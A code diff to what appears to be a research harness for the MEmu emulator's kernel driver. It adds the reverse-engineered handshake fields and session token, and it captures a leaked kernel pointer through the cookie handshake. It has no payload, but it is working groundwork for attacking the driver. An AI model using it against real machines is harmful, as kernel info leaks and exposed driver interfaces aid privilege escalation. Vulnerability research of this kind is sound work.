@@ -35,6 +35,9 @@
 #define MEMU_DEVICE_PATH_U  L"\\\\.\\MEmuDrvU"
 #define MEMU_COOKIE_MAGIC   "The Magic Word!"
 #define MEMU_DRIVER_VERSION 0x2A0000
+#define MEMU_CODE_COOKIE    0x69726F74u   // 'tori' - CodeEcho for the handshake
+#define MEMU_CODE_SESSION   0x12345678u   // CodeEcho for other commands (devext magic)
+#define MEMU_HDR_MAGIC      0x42000042u   // (v & 0xFF0000FF) == 0x42000042
 #define MEMU_FUNCTION_COUNT 274            // QUERY_FUNCS reports 274 SUPR0 exports
 
 #define MEMU_CTL(fn, method) CTL_CODE(FILE_DEVICE_UNKNOWN, (fn) | 0x80, FILE_WRITE_ACCESS, method)
@@ -112,11 +115,11 @@ enum memu_status : int32_t {
 
 // request header — 24 bytes
 struct MEMU_REQHDR {
-    uint32_t f00;
-    uint32_t f04;
+    uint32_t CodeEcho;      // +0x00 ('tori' for cookie, 0x12345678 for the rest)
+    uint32_t SessionToken;  // +0x04 (from the cookie response; 0 for cookie)
     uint32_t cbIn;          // +0x08
     uint32_t cbOut;         // +0x0C
-    uint32_t f10;
+    uint32_t HdrMagic;      // +0x10 ((v & 0xFF0000FF) == 0x42000042)
     int32_t  status;        // +0x14
 };
 
@@ -257,10 +260,16 @@ public:
     MemuDrv(const MemuDrv&) = delete;
     MemuDrv& operator=(const MemuDrv&) = delete;
 
-    bool Open(const wchar_t* path = MEMU_DEVICE_PATH) {
-        if (h != INVALID_HANDLE_VALUE) return true;
+    // opens the exact path given. note: the driver never calls
+    // IoCreateSymbolicLink, so \\.\MEmuDrv has no symlink — use the
+    // GlobalROOT candidates to reach \Device\ directly. callers should
+    // probe both devices (Drv and DrvU) since the command surface may
+    // differ between them.
+    bool Open(const wchar_t* path) {
+        if (h != INVALID_HANDLE_VALUE) Close();
         h = CreateFileW(path, GENERIC_READ | GENERIC_WRITE, 0,
                         nullptr, OPEN_EXISTING, 0, nullptr);
+        pathUsed = (h != INVALID_HANDLE_VALUE) ? path : nullptr;
         return h != INVALID_HANDLE_VALUE;
     }
 
@@ -271,11 +280,15 @@ public:
     bool IsOpen() const { return h != INVALID_HANDLE_VALUE; }
 
     // cookie handshake; returns session/driver version, 0 on failure.
-    // also returns the leaked kernel session pointer (info-leak evidence).
+    // captures the session token (needed by every later command) and the
+    // leaked kernel session pointer.
     uint32_t Handshake(uint64_t* sessionKernel = nullptr) {
         MEMU_COOKIE_REQ r{};
+        r.hdr.CodeEcho     = MEMU_CODE_COOKIE;
+        r.hdr.SessionToken = 0;
         r.hdr.cbIn  = 48;
         r.hdr.cbOut = 56;
+        r.hdr.HdrMagic = MEMU_HDR_MAGIC;
         memcpy(r.Magic, MEMU_COOKIE_MAGIC, sizeof(r.Magic));
         r.ReqVersion = MEMU_DRIVER_VERSION;
         r.MinVersion = MEMU_DRIVER_VERSION;
@@ -283,6 +296,7 @@ public:
             return 0;
         if (r.hdr.status != memu_ok)
             return 0;
+        sessionToken = r.OutFlags;
         if (sessionKernel) *sessionKernel = r.SessionKernel;
         return r.SessionVersion;
     }
@@ -293,8 +307,11 @@ public:
     // loaded or executed; the module is released by closing the session.
     bool LdrOpenFallbackProbe(const char* name, uint64_t& moduleHandle, uint8_t& fromFile) {
         MEMU_LDROPEN_REQ r{};
+        r.hdr.CodeEcho     = MEMU_CODE_SESSION;
+        r.hdr.SessionToken = sessionToken;
         r.hdr.cbIn  = sizeof(r);          // 328
         r.hdr.cbOut = 40;
+        r.hdr.HdrMagic = MEMU_HDR_MAGIC;
         strncpy_s(r.szName, sizeof(r.szName), name, _TRUNCATE);
         strcpy_s(r.szFilename, sizeof(r.szFilename),
                  "Z:\\__memudrv_probe_no_such_file.sys");   // does not exist
@@ -310,6 +327,8 @@ public:
     }
 
     HANDLE Handle() const { return h; }
+    const wchar_t* PathUsed() const { return pathUsed; }
+    uint32_t SessionToken() const { return sessionToken; }
 
 private:
     bool Transact(DWORD code, void* buf, DWORD len) {
@@ -319,4 +338,6 @@ private:
     }
 
     HANDLE h = INVALID_HANDLE_VALUE;
+    const wchar_t* pathUsed = nullptr;
+    uint32_t sessionToken = 0;
 };
